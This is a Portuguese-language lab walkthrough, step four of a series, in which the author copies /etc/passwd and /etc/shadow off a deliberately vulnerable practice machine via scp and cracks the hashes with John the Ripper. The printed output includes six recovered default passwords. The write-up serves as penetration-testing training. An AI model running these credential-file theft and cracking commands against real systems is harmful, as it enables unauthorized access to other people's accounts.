# 04. Bruteforce de senhas de usuários com John the Ripper

Após conseguir o acesso ao SSH da nossa máquina alvo (leia <a href="/steps/03_ganhando_acesso_direto_ao_ssh.md">03. Ganhando acesso direto ao <b>SSH</b></a>), vamos tentar comprometer e ter acesso as senhas dos outros usuários existentes na máquina alvo.

No Linux, existem dois arquivos armazenados a <i><b>"nível de sistema operacional"</b></i> que contém informações de login de usuários daquela mesma máquina - o `passwd`, localizado em `/etc/passwd`, e o `shadow`, localizado em `/etc/shadow`.

Vamos copiar esses dois arquivos para o nosso sistema operacional atacante e tentar fazer o bruteforce dos hashes das senhas dos usuários:

```
$ scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.56.102:/etc/passwd Documents/passwd                  
passwd                                                                                                                                 100% 1581     1.0MB/s   00:00    
                                                                                                                                                                         
$ scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.56.102:/etc/shadow Documents/shadow
shadow                                                                                                                                 100% 1207   940.6KB/s   00:00
```

Documentos passados pra nossa máquina atacante, vamos gerar um documento no formato que o <i><b>John the Ripper</b></i> possa reconhecer e fazer o processo de bruteforce nas hashs:

```
$ cd Documents && unshadow passwd shadow > ms2_unshadow.txt
Created directory: /home/pqpmath3ws/.john
```

Unificamos as informações dos dois arquivos, e agora iremos usar o <i><b>John the Ripper</b></i> para tentar descobrir as senhas dos usuários presentes na máquina.

O <i><b>John the Ripper</b></i> é uma ferramenta <i><b>open-source</b></i> de auditoria de segurança de senhas e recuperação de senhas de código aberto disponível para muitos sistemas operacionais.

Com a explicação feita, vamos executar o seguinte comando:

`$ john ms2_unshadow.txt`

E o retorno do mesmo nos dão as seguintes informações:

```
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
user             (user)     
postgres         (postgres)     
msfadmin         (msfadmin)     
service          (service)     
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
123456789        (klog)     
batman           (sys)     
Proceeding with incremental:ASCII
6g 0:07:07:35  3/3 0.000233g/s 68490p/s 68490c/s 68490C/s aakkk62..aak18oc
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

O <i><b>John the Ripper</b></i> apontou para gente as seguintes informações:

- Usuário: `klog` / Senha: `123456789`
- Usuário: `msfadmin` / Senha: `msfadmin`
- Usuário: `postgres` / Senha: `postgres`
- Usuário: `service` / Senha: `service`
- Usuário: `sys` / Senha: `batman`
- Usuário: `user` / Senha: `user`

O <b>ÚNICO</b> usuário que ficou faltando da lista foi o `root` <i><b>(AINDA NÃO DESCOBERTA A SENHA)</b></i>.

Eu abortei o processo depois de pegar os 6 outros usuários pois eu tentei quebrar essa mesma hash com outro software <i><b>open-source</b></i> usando o mesmo dicionário (localizado em `/usr/share/john/password.lst`) e até onde eu executei, ainda não achei a senha do mesmo. Tenso, mas faz parte ;)

Com as senhas da maioria dos usuários expostas, vamos continuar com o nosso progresso - o céu é o limite! Vamos para a nossa próxima etapa!